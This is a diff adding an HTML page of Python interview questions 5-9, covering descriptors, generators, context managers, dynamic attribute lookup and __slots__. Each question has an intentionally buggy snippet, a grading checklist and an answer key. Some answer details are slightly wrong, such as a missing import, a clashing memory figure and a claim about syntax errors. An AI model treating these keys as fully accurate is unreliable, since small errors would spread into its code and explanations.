+When Python parses a <code>class</code> block:<br>
+1. Finds the metaclass (default: <code>type</code>).<br>
+2. Calls <code>metaclass.__prepare__(name, bases)</code> to create the class namespace dictionary.<br>
+3. Executes the class body within that dictionary namespace.<br>
+4. Calls <code>metaclass.__new__(mcs, name, bases, namespace)</code> to allocate and construct the class object in memory.<br>
+5. Calls <code>metaclass.__init__(cls, name, bases, namespace)</code> to initialize the class object.<br><br>
+<strong>2. Modern Pythonic Implementation with __init_subclass__:</strong><br>
+<pre><code>from typing import Any
+
+class BasePaymentPlugin:
+    def __init_subclass__(cls, **kwargs: Any) -> None:
+        super().__init_subclass__(**kwargs)
+        
+        # Enforce class attribute existence and type
+        version = getattr(cls, 'PLUGIN_VERSION', None)
+        if not isinstance(version, str) or not version.strip():
+            raise TypeError(f"Class '{cls.__name__}' must define non-empty class attribute 'PLUGIN_VERSION: str'")
+            
+        # Enforce method implementation
+        if not callable(getattr(cls, 'execute_transaction', None)):
+            raise TypeError(f"Class '{cls.__name__}' must implement callable method 'execute_transaction'")
+
+# Validating class definition at import time:
+class CryptoPaymentPlugin(BasePaymentPlugin):
+    # Omitting execute_transaction will raise TypeError immediately upon module import!
+    PLUGIN_VERSION = "2.1.0"</code></pre><br>
+<strong>Why __init_subclass__ is superior:</strong> Metaclasses introduce severe metaclass conflicts under multiple inheritance (if base classes have different metaclasses, Python raises a <code>TypeError: metaclass conflict</code>). <code>__init_subclass__</code> handles inheritance hooks cleanly without custom metaclasses.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-5" data-keywords="descriptors __get__ __set__ __delete__ data descriptor non data descriptor orm property">
+                    <div class="card-header">
+                        <span class="concept-badge">Descriptors Protocol &amp; Attribute Lookup</span>
+                        <span class="q-number">Question 5 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                The <strong>Python Descriptors Protocol</strong> (<code>__get__</code>, <code>__set__</code>, <code>__delete__</code>): Difference between data descriptors and non-data descriptors, their priority in the CPython attribute lookup order, and building reusable field validators.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                You are building a high-speed in-memory entity validation engine for a trading platform. Look at the code snippet.
+<br><br>
+<strong>Part A:</strong> Explain the fundamental difference between a <strong>Data Descriptor</strong> and a <strong>Non-Data Descriptor</strong>. How does CPython prioritize them against an instance's <code>__dict__</code> during attribute lookup?
+<br>
+<strong>Part B:</strong> In the snippet, why does storing the validated value directly on <code>self.val = value</code> inside the descriptor instance create a critical state pollution bug across multiple <code>Trade</code> instances?
+<br>
+<strong>Part C:</strong> Implement a production-grade <code>PositiveDecimal</code> descriptor using <code>__set_name__</code> (PEP 487) to store values cleanly in each host instance's dictionary without memory leaks.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('5', 'trade_descriptors.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-5" style="display:none;">from decimal import Decimal
+
+class BrokenPositiveDecimal:
+    def __init__(self):
+        # BUG: self.val belongs to the descriptor, which is a CLASS attribute!
+        self.val: Decimal = Decimal(&#x27;0&#x27;)
+
+    def __get__(self, instance, owner):
+        if instance is None:
+            return self
+        return self.val
+
+    def __set__(self, instance, value):
+        if not isinstance(value, Decimal) or value &lt;= Decimal(&#x27;0&#x27;):
+            raise ValueError(&quot;Must be a positive Decimal&quot;)
+        self.val = value
+
+class Trade:
+    price = BrokenPositiveDecimal()
+    volume = BrokenPositiveDecimal()
+
+# Test demonstrating the catastrophic state leak:
+t1 = Trade()
+t2 = Trade()
+t1.price = Decimal(&#x27;100.50&#x27;)
+t2.price = Decimal(&#x27;999.99&#x27;)
+print(t1.price) # Prints 999.99! Both trades share the same price!</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-5">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 5, 1, 'The Python Descriptors Protocol (__get__, __set__, __delete__): Difference between data descriptors and non-data descrip')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 5, 2, 'The Python Descriptors Protocol (__get__, __set__, __delete__): Difference between data descriptors and non-data descrip')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 5, 3, 'The Python Descriptors Protocol (__get__, __set__, __delete__): Difference between data descriptors and non-data descrip')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 5, 4, 'The Python Descriptors Protocol (__get__, __set__, __delete__): Difference between data descriptors and non-data descrip')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-5">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate identify that descriptors are stored on the <em>Class</em> object, not the instance; storing instance data in descriptor <code>self</code> shares state across all instances?</li>
+<li>Do they explain Data Descriptor (defines <code>__set__</code> or <code>__delete__</code>) overrides instance <code>__dict__</code>, while Non-Data Descriptor (only <code>__get__</code>) is overridden by instance <code>__dict__</code>?</li>
+<li>Do they use <code>__set_name__(self, owner, name)</code> introduced in PEP 487 to dynamically bind the field name?</li>
+<li>Do they write the validated value into <code>instance.__dict__[self.private_name]</code>?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. Data vs Non-Data Descriptors & Lookup Precedence:</strong><br>
+When accessing <code>obj.attr</code>, CPython follows this strict order:<br>
+1. <strong>Data Descriptors</strong> on the class hierarchy (defines <code>__set__</code> and/or <code>__delete__</code>) — highest priority.<br>
+2. <strong>Instance <code>__dict__</code></strong> of <code>obj</code>.<br>
+3. <strong>Non-Data Descriptors</strong> (only defines <code>__get__</code>, e.g., standard methods and functions).<br>
+4. Class <code>__dict__</code>.<br>
+5. <code>__getattr__</code> fallback.<br><br>
+<strong>2. Production Solution with PEP 487 __set_name__:</strong><br>
+<pre><code>from decimal import Decimal
+from typing import Any
+
+class PositiveDecimal:
+    def __set_name__(self, owner: type, name: str) -> None:
+        # Automatically capture the attribute name when class is created
+        self.storage_name = f"_{name}"
+
+    def __get__(self, instance: Any, owner: type) -> Any:
+        if instance is None:
+            return self
+        return getattr(instance, self.storage_name, Decimal('0'))
+
+    def __set__(self, instance: Any, value: Any) -> None:
+        if not isinstance(value, Decimal) or value <= Decimal('0'):
+            raise ValueError(f"Attribute '{self.storage_name}' must be a strictly positive Decimal")
+        # Store in instance dict, ensuring complete isolation between instances
+        setattr(instance, self.storage_name, value)
+
+class Trade:
+    price = PositiveDecimal()
+    volume = PositiveDecimal()</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-6" data-keywords="generators yield yield from itertools stream memory exhaustion chunking">
+                    <div class="card-header">
+                        <span class="concept-badge">Generators &amp; Memory Streaming</span>
+                        <span class="q-number">Question 6 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                <strong>Generators, Memory Streaming & Coroutines</strong>: Low-memory processing of multi-gigabyte files, <code>yield</code> vs <code>yield from</code> delegation, generator lifecycle, and resolving generator exhaustion errors.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                A financial compliance job parses a 40GB compressed audit log every midnight. The server frequently crashes with exit code 137 (Killed by Linux OOM killer). Look at the code.
+<br><br>
+<strong>Part A:</strong> Explain why <code>load_all_records()</code> consumes tens of gigabytes of RAM while returning a generator expression over list comprehensions.
+<br>
+<strong>Part B:</strong> What is generator exhaustion? What happens when a downstream consumer calls <code>len(generator)</code> or iterates over the same generator object twice?
+<br>
+<strong>Part C:</strong> Refactor the entire ingestion pipeline using true streaming generator pipelines and <code>yield from</code> so memory consumption stays under 50MB regardless of file size.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('6', 'audit_streaming.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-6" style="display:none;">from typing import List, Generator, Dict
+import json
+
+def load_all_records(filepath: str) -&gt; List[Dict]:
+    # Memory Bomb: Read entire 40GB file into RAM at once!
+    with open(filepath, &#x27;r&#x27;) as f:
+        lines = f.readlines() 
+    return [json.loads(line) for line in lines if &quot;ERROR&quot; in line]
+
+def calculate_audit_stats(filepath: str) -&gt; None:
+    records = load_all_records(filepath)
+    print(f&quot;Total error events: {len(records)}&quot;)
+    
+    # Process stage 1: Group by tenant
+    tenant_events = [r for r in records if r.get(&#x27;tenant&#x27;) == &#x27;ENTERPRISE&#x27;]
+    print(f&quot;Enterprise events: {len(tenant_events)}&quot;)</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-6">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 6, 1, 'Generators, Memory Streaming & Coroutines: Low-memory processing of multi-gigabyte files, yield vs yield from delegation')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 6, 2, 'Generators, Memory Streaming & Coroutines: Low-memory processing of multi-gigabyte files, yield vs yield from delegation')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 6, 3, 'Generators, Memory Streaming & Coroutines: Low-memory processing of multi-gigabyte files, yield vs yield from delegation')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 6, 4, 'Generators, Memory Streaming & Coroutines: Low-memory processing of multi-gigabyte files, yield vs yield from delegation')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-6">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate identify that <code>f.readlines()</code> reads the entire 40GB file into a Python list of strings in heap memory?</li>
+<li>Do they explain that generator objects cannot be indexed, do not implement <code>__len__</code>, and are single-pass (exhausted once traversed)?</li>
+<li>Do they write a generator function using <code>for line in f: yield json.loads(line)</code> to stream line-by-line in $O(1)$ memory?</li>
+<li>Do they use <code>itertools.tee</code> or single-pass running aggregations to avoid iterating twice?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. Memory Analysis:</strong><br>
+<code>f.readlines()</code> loads every line into memory as individual Python <code>PyUnicode</code> objects. In Python, a raw string has significant object header overhead (49–80 bytes per string plus pointers). A 40GB text file easily balloons to 70GB+ in CPython heap memory.<br><br>
+<strong>2. Streaming Generator Architecture:</strong><br>
+<pre><code>import json
+from typing import Generator, Dict, Any
+
+def stream_audit_records(filepath: str) -> Generator[Dict[str, Any], None, None]:
+    # Reading file object line-by-line utilizes internal buffered I/O: O(1) memory!
+    with open(filepath, 'r', encoding='utf-8') as f:
+        for line in f:
+            if "ERROR" in line:
+                yield json.loads(line)
+
+def process_stream_single_pass(filepath: str) -> Dict[str, int]:
+    stats = {"total_errors": 0, "enterprise_errors": 0}
+    # Stream through generator once without loading entire dataset
+    for record in stream_audit_records(filepath):
+        stats["total_errors"] += 1
+        if record.get("tenant") == "ENTERPRISE":
+            stats["enterprise_errors"] += 1
+    return stats</code></pre><br>
+<strong>3. <code>yield from</code> usage:</strong> <code>yield from subgenerator()</code> transparently delegates iteration, <code>.send()</code> values, and exceptions directly between caller and subgenerator without nested boilerplate loops.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-7" data-keywords="context manager contextlib enter exit exception suppression rollback reentrant">
+                    <div class="card-header">
+                        <span class="concept-badge">Context Managers &amp; Exception Suppression</span>
+                        <span class="q-number">Question 7 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                <strong>Context Managers & Resource Lifecycle</strong>: Protocol implementation (<code>__enter__</code>, <code>__exit__</code>), exception suppression semantics, contextlib utilities, and async context managers (<code>__aenter__</code>, <code>__aexit__</code>).
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                You are building a distributed Redis transactional lock and database transaction manager. Look at the code.
+<br><br>
+<strong>Part A:</strong> Under the <code>__exit__(self, exc_type, exc_val, exc_tb)</code> contract, how does a context manager signal to Python whether an exception raised in the <code>with</code> block should be suppressed or propagated?
+<br>
+<strong>Part B:</strong> In the snippet, why is returning <code>True</code> unconditionally in <code>__exit__</code> a dangerous anti-pattern that hides catastrophic application bugs (like <code>ZeroDivisionError</code> or <code>KeyError</code>)?
+<br>
+<strong>Part C:</strong> Implement an asynchronous context manager (<code>AsyncDatabaseTransaction</code>) with <code>__aenter__</code> and <code>__aexit__</code> that guarantees transaction rollback upon error, commits on success, and re-raises exceptions cleanly.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('7', 'managed_transaction.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-7" style="display:none;">class BrokenTransactionManager:
+    def __init__(self, db_conn):
+        self.db = db_conn
+
+    def __enter__(self):
+        self.db.begin()
+        return self.db
+
+    def __exit__(self, exc_type, exc_val, exc_tb):
+        if exc_type is not None:
+            self.db.rollback()
+            # CRITICAL BUG: Returning True silently swallows ALL exceptions!
+            return True 
+        self.db.commit()
+        return False
+
+# Dangerous consequence:
+with BrokenTransactionManager(db) as conn:
+    conn.execute(&quot;INSERT INTO audit VALUES (1)&quot;)
+    user = 10 / 0 # ZeroDivisionError swallowed! Code continues as if successful!</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-7">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 7, 1, 'Context Managers & Resource Lifecycle: Protocol implementation (__enter__, __exit__), exception suppression semantics, c')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 7, 2, 'Context Managers & Resource Lifecycle: Protocol implementation (__enter__, __exit__), exception suppression semantics, c')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 7, 3, 'Context Managers & Resource Lifecycle: Protocol implementation (__enter__, __exit__), exception suppression semantics, c')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 7, 4, 'Context Managers & Resource Lifecycle: Protocol implementation (__enter__, __exit__), exception suppression semantics, c')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-7">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate know that returning a truthy value from <code>__exit__</code> swallows the exception, while returning <code>False</code> or <code>None</code> propagates it?</li>
+<li>Do they explain that swallow/suppression should only be done for explicitly handled expected exception types?</li>
+<li>Do they write an <code>async with</code> context manager implementing <code>__aenter__</code> and <code>__aexit__</code>?</li>
+<li>Do they ensure database rollback runs even if an unhandled cancellation or exception occurs?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. The Exception Suppression Rule:</strong><br>
+In CPython, if an exception is raised inside a <code>with</code> block, <code>__exit__(exc_type, exc_val, exc_tb)</code> is called with the exception details. If <code>__exit__</code> returns <code>True</code>, Python clears the exception and execution resumes normally after the <code>with</code> block. If it returns <code>False</code>, <code>None</code>, or any falsy value, Python propagates the exception upward. Returning <code>True</code> unconditionally masks syntax errors, bugs, and data corruption.<br><br>
+<strong>2. Production Async Context Manager:</strong><br>
+<pre><code>from typing import Optional, Type
+import sys
+
+class AsyncDatabaseTransaction:
+    def __init__(self, async_db_conn):
+        self.conn = async_db_conn
+
+    async def __aenter__(self):
+        await self.conn.begin()
+        return self.conn
+
+    async def __aexit__(
+        self,
+        exc_type: Optional[Type[BaseException]],
+        exc_val: Optional[BaseException],
+        exc_tb: Optional[Any]
+    ) -> bool:
+        if exc_type is not None:
+            # Guarantee rollback on failure
+            await self.conn.rollback()
+            # Return False to guarantee full exception propagation
+            return False
+            
+        await self.conn.commit()
+        return False</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-8" data-keywords="getattr getattribute recursion magic methods dynamic proxy rpc">
+                    <div class="card-header">
+                        <span class="concept-badge">Dynamic Attribute Dispatch &amp; Magic Methods</span>
+                        <span class="q-number">Question 8 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                Dynamic Attribute Resolution in CPython: The critical distinction between <code>__getattr__</code> and <code>__getattribute__</code>, avoiding infinite recursion traps, and building dynamic RPC proxies.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                A team builds a dynamic Remote Procedure Call (RPC) proxy that converts method invocations like <code>client.users.get_profile(user_id=42)</code> into HTTP calls. Look at the code.
+<br><br>
+<strong>Part A:</strong> Running this code triggers <code>RecursionError: maximum recursion depth exceeded while calling a Python object</code>. Why does accessing <code>self.base_url</code> inside <code>__getattribute__</code> cause infinite recursion?
+<br>
+<strong>Part B:</strong> What is the exact behavioral difference between <code>__getattribute__</code> (invoked for <em>every</em> attribute access) and <code>__getattr__</code> (invoked only as fallback when attribute lookup fails)?
+<br>
+<strong>Part C:</strong> Fix the recursion error using <code>super().__getattribute__</code> and refactor the proxy to use <code>__getattr__</code> cleanly.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('8', 'dynamic_rpc_proxy.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-8" style="display:none;">class BrokenRpcClient:
+    def __init__(self, base_url: str):
+        self.base_url = base_url
+
+    def __getattribute__(self, name: str):
+        # BUG: self.base_url triggers __getattribute__ again -&gt; INFINITE RECURSION!
+        if name.startswith(&quot;api_&quot;):
+            return f&quot;Intercepted: {self.base_url}/{name}&quot;
+        return super().__getattribute__(name)
+
+# Attempt to instantiate:
+client = BrokenRpcClient(&quot;https://api.internal&quot;)
+print(client.base_url) # CRASH: RecursionError!</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-8">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 8, 1, 'Dynamic Attribute Resolution in CPython: The critical distinction between __getattr__ and __getattribute__, avoiding inf')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 8, 2, 'Dynamic Attribute Resolution in CPython: The critical distinction between __getattr__ and __getattribute__, avoiding inf')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 8, 3, 'Dynamic Attribute Resolution in CPython: The critical distinction between __getattr__ and __getattribute__, avoiding inf')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 8, 4, 'Dynamic Attribute Resolution in CPython: The critical distinction between __getattr__ and __getattribute__, avoiding inf')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-8">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate identify that <code>self.base_url</code> inside <code>__getattribute__</code> calls <code>__getattribute__</code> again recursively?</li>
+<li>Do they explain <code>__getattribute__</code> is the unconditional entry point for all attribute resolution, while <code>__getattr__</code> is only called if the attribute is NOT found in class/instance dicts?</li>
+<li>Do they break recursion using <code>super().__getattribute__(name)</code> or <code>object.__getattribute__(self, name)</code>?</li>
+<li>Do they recognize that <code>__getattr__</code> is the preferred idiomatic choice for building RPC proxies?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. The Recursion Trap:</strong><br>
+<code>__getattribute__</code> intercepts <em>all</em> attribute accesses on the instance, regardless of whether the attribute exists in <code>__dict__</code>. Inside <code>__getattribute__</code>, calling <code>self.base_url</code> triggers <code>self.__getattribute__('base_url')</code>, which calls <code>self.base_url</code> again, causing an infinite loop that exhausts the Python call stack.<br><br>
+<strong>2. Clean RPC Proxy Implementation with __getattr__:</strong><br>
+<pre><code>from typing import Any, Callable
+
+class RpcClientProxy:
+    def __init__(self, base_url: str):
+        # Store directly in instance dict
+        self.base_url = base_url
+
+    # __getattr__ only executes if 'name' is NOT already in self.__dict__
+    def __getattr__(self, name: str) -> Callable[..., Any]:
+        def rpc_method_dispatcher(**kwargs: Any) -> dict:
+            endpoint = f"{self.base_url}/{name}"
+            # Dispatch network request with kwargs
+            return {"endpoint": endpoint, "payload": kwargs, "status": 200}
+        return rpc_method_dispatcher
+
+client = RpcClientProxy("https://api.internal")
+print(client.base_url) # Accesses self.base_url directly without invoking __getattr__
+print(client.getUserProfile(user_id=101)) # Successfully dispatches via __getattr__!</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-9" data-keywords="slots memory footprint __dict__ weakref optimization performance cache locality">
+                    <div class="card-header">
+                        <span class="concept-badge">Memory Optimization &amp; __slots__</span>
+                        <span class="q-number">Question 9 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                CPython <strong>Object Layout & <code>__slots__</code></strong>: Eliminating per-instance dynamic dictionaries (<code>__dict__</code>), improving memory footprint by 60–80%, cache locality, and inheritance pitfalls with <code>__slots__</code>.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                A high-frequency trading platform maintains an in-memory order book holding 5,000,000 <code>OrderTick</code> objects. The memory footprint exceeds 4.5 Gigabytes, causing excessive Linux page swapping. Look at the code.
+<br><br>
+<strong>Part A:</strong> Explain the internal memory overhead of a standard CPython class instance (<code>PyObject</code> header + pointer to dynamic <code>__dict__</code> dictionary table).
+<br>
+<strong>Part B:</strong> How does declaring <code>__slots__</code> transform the C struct memory layout of an object from a dynamic hash map to fixed array descriptors?
+<br>
+<strong>Part C:</strong> Refactor <code>OrderTick</code> using <code>__slots__</code>. Explain the critical caveats when subclassing a class with <code>__slots__</code>, dynamic attribute assignment, and why <code>__weakref__</code> must be explicitly included if weak references are needed.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('9', 'order_book_memory.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-9" style="display:none;">import sys
+
+class StandardOrderTick:
+    def __init__(self, tick_id: int, symbol: str, price: float, volume: int):
+        self.tick_id = tick_id
+        self.symbol = symbol
+        self.price = price
+        self.volume = volume
+
+# In CPython, each instance creates a full __dict__ (~152 bytes + dynamic resizing)
+ticks = [StandardOrderTick(i, &quot;AAPL&quot;, 150.25, 100) for i in range(1_000_000)]
+# Consumes ~160 MB for just 1M ticks! 5M ticks = ~800MB - 1GB pure RAM!</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-9">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 9, 1, 'CPython Object Layout & __slots__: Eliminating per-instance dynamic dictionaries (__dict__), improving memory footprint ')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 9, 2, 'CPython Object Layout & __slots__: Eliminating per-instance dynamic dictionaries (__dict__), improving memory footprint ')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 9, 3, 'CPython Object Layout & __slots__: Eliminating per-instance dynamic dictionaries (__dict__), improving memory footprint ')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 9, 4, 'CPython Object Layout & __slots__: Eliminating per-instance dynamic dictionaries (__dict__), improving memory footprint ')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-9">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate explain that every standard Python object contains a <code>__dict__</code> attribute which is an expansive hash table?</li>
+<li>Do they explain <code>__slots__</code> replaces <code>__dict__</code> with a compact struct of C-level pointers, cutting per-object overhead by ~70%?</li>
+<li>Do they correctly define <code>__slots__ = ('tick_id', 'symbol', 'price', 'volume')</code>?</li>
+<li>Do they note that subclasses must also define <code>__slots__</code>, otherwise Python creates a <code>__dict__</code> for the subclass?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. Standard Object Overhead:</strong><br>
+In CPython, an ordinary object instance contains:<br>
+• <code>PyObject_HEAD</code> (16 bytes: ref count + type pointer).<br>
+• Pointer to instance <code>__dict__</code> (8 bytes).<br>
+• The <code>PyDictObject</code> itself (starts at ~112 bytes and expands dynamically to maintain $<2/3$ load factor).<br>
+Each instance thus consumes ~150–200 bytes of overhead before storing any actual field data.<br><br>
+<strong>2. Memory Optimization with __slots__:</strong><br>
+<pre><code>class OptimizedOrderTick:
+    # Allocates fixed C pointer offsets in the class struct; eliminates __dict__
+    __slots__ = ('tick_id', 'symbol', 'price', 'volume', '__weakref__')
+
+    def __init__(self, tick_id: int, symbol: str, price: float, volume: int):
+        self.tick_id = tick_id
+        self.symbol = symbol
+        self.price = price
+        self.volume = volume</code></pre><br>
+<strong>3. Caveats & Pitfalls:</strong><br>
+• <strong>Inheritance:</strong> If a subclass does not define <code>__slots__ = ()</code>, Python will silently create a <code>__dict__</code> on the subclass, defeating memory savings.<br>
